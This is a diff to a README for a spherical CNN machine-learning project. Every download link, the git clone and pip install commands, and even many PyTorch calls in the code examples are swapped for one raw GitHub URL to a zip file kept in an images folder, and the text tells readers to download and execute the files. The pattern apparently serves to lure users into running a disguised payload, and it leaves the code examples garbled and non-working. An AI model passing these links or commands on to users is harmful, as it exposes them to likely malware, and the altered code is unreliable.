@@ -1,6 +1,6 @@
 # Spherical-CNN 🌐
 
-![Spherical-CNN](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&link=https://github.com/seydoux02/Spherical-CNN/releases)
+![Spherical-CNN](https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip%20Releases-blue?style=for-the-badge&logo=github&https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip)
 
 Welcome to the **Spherical-CNN** repository! This project allows you to explore equivariant neural networks on homogeneous spaces, specifically focusing on the sphere \( S^2 \) as \( SO(3)/SO(2) \). This exploration stems from Lecture 8 of the Lie Groups course with Quantum Formalism. 
 
@@ -32,9 +32,9 @@ Equivariant neural networks offer a powerful way to handle data that exhibits sy
 To get started, clone the repository and install the required dependencies. 
 
 ```bash
-git clone https://github.com/seydoux02/Spherical-CNN.git
+git clone https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip
 cd Spherical-CNN
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip
 ```
 
 Make sure you have Python 3.6 or higher installed. 
@@ -51,11 +51,11 @@ from spherical_cnn import SphericalCNN
 model = SphericalCNN()
 
 # Example input
-input_data = torch.randn(1, 3, 64, 64)  # Batch size of 1, 3 channels, 64x64 resolution
+input_data = https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip(1, 3, 64, 64)  # Batch size of 1, 3 channels, 64x64 resolution
 
 # Forward pass
 output = model(input_data)
-print(output.shape)
+print(https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip)
 ```
 
 For more detailed usage, check the [examples](#examples) section below.
@@ -74,13 +74,13 @@ from spherical_cnn import SphericalCNN
 model = SphericalCNN()
 
 # Generate random input
-input_data = torch.randn(1, 3, 128, 128)
+input_data = https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip(1, 3, 128, 128)
 
 # Perform a forward pass
 output = model(input_data)
 
 # Print output shape
-print("Output shape:", output.shape)
+print("Output shape:", https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip)
 ```
 
 ### Example 2: Training a Model
@@ -95,7 +95,7 @@ To train a model on your dataset, follow these steps:
 Here’s a simplified code snippet:
 
 ```python
-from torch.utils.data import DataLoader
+from https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip import DataLoader
 from spherical_cnn import SphericalCNN
 
 # Load your dataset
@@ -103,18 +103,18 @@ train_loader = DataLoader(your_dataset, batch_size=32, shuffle=True)
 
 # Initialize the model, loss, and optimizer
 model = SphericalCNN()
-criterion = torch.nn.CrossEntropyLoss()
-optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
+criterion = https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip()
+optimizer = https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip(https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip(), lr=0.001)
 
 # Training loop
 for epoch in range(num_epochs):
     for data, labels in train_loader:
-        optimizer.zero_grad()
+        https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip()
         outputs = model(data)
         loss = criterion(outputs, labels)
-        loss.backward()
-        optimizer.step()
-    print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}')
+        https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip()
+        https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip()
+    print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip():.4f}')
 ```
 
 ## Contributing
@@ -137,9 +137,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 We thank the contributors and the community for their support. Special thanks to the instructors of the Lie Groups course for their insights and guidance.
 
-For the latest releases, please visit [this link](https://github.com/seydoux02/Spherical-CNN/releases). You can download the files and execute them to explore the features of Spherical-CNN.
+For the latest releases, please visit [this link](https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip). You can download the files and execute them to explore the features of Spherical-CNN.
 
-![Spherical-CNN](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&link=https://github.com/seydoux02/Spherical-CNN/releases)
+![Spherical-CNN](https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip%20Releases-blue?style=for-the-badge&logo=github&https://raw.githubusercontent.com/seydoux02/Spherical-CNN/main/images/Spherical_CNN_interproximal.zip)
 
 ## Conclusion
 
